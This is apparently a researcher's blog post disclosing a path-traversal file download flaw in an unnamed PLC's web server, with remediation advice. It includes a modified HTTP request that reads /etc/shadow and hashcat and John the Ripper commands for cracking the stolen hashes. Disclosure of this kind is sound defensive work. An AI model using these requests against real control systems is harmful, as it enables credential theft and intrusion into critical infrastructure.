---
layout: single
title: PLC Web Server Arbitrary File Download
date: 2023-2-26
classes: wide
header:
  teaser: 
tags:
  - CVE
  - Web
---

Introduction
---
In this post I'll go over a simple arbitrary file download vulnerability I found on the webserver of a commonly used PLC. 
To avoid disclosing the vulnerability to the public before a CVE has been formally given, I won't give specific details of the brand, model, and software this exploit applies to. 

This can be leveraged to gain root access on the underlying OS and implant backdoors, further traverse through the network, interrupt the normal operation of critical infrastructure, etc. 


The basic flow of the exploiting the vuln goes as follows:

1. Login to the web server with credentials for the admin user on the PLC.
2. Find/enable OpenVPN file download and upload.
3. Intercept the download.php request and replace the openvpn file it's requesting with any arbitrary file
4. Profit?

Exploitation
---
Intercepting the request to download the OpenVPN config and  looking further we can see that the path to the file we're downloading is communicated to us. We can attempt to change the path to a file that we would like to download instead. 
```
GET /XXX/php/file_transfer/download.php?download=/tmp/vpncfg-out/openvpn.conf&csrf=yourCSRFtoken HTTP/1.1
Host: 192.168.1.87
Cookie: REDACTED
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: iframe
Referer: https://192.168.1.87/XXX/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

To:
`GET /XXX/php/file_transfer/download.php?download=/etc/shadow&csrf=yourCSRFtoken HTTP/1.1`

We can leverage this to download the /etc/shadow and /etc/password file, unshadow them, then crack the passwords to login as root via SSH and/or reuse the credentials somewhere else in the network.

Bonus Points
---
#### Using John The Ripper:
```
unshadow passwd shadow
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

#### Using Hashcat:

With hashcat we don't have to unshadow the files to match the users to the the hashes like John the ripper. 
Feed Hashcat the shadow file with -m specified for  `1800 | sha512crypt $6$, SHA512 (Unix) | Operating System`
```
hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou1.txt
```


Remediation
---
The vulnerable code can be found in the download.php file. 
```
if (isset($_GET['download'])) {
    $downloadPath = $_GET['download'];
```

What could be done to make this more secure is:
1. Check if the file is allowed to be accessed before downloading. Whitelisting acceptable file paths for example.
2. Remove the ability for users to modify the path of the file downloaded.
3. Make sure that the web server user has the least amount of privilege necessary to accomplish the task.

Conclusion
---
I will come out with a PoC script to automate exploitation of the vuln along with more details when the vuln is officially allowed to be disclosed. With proper protections put in place this vuln shouldn't even be possible to execute anyway. 
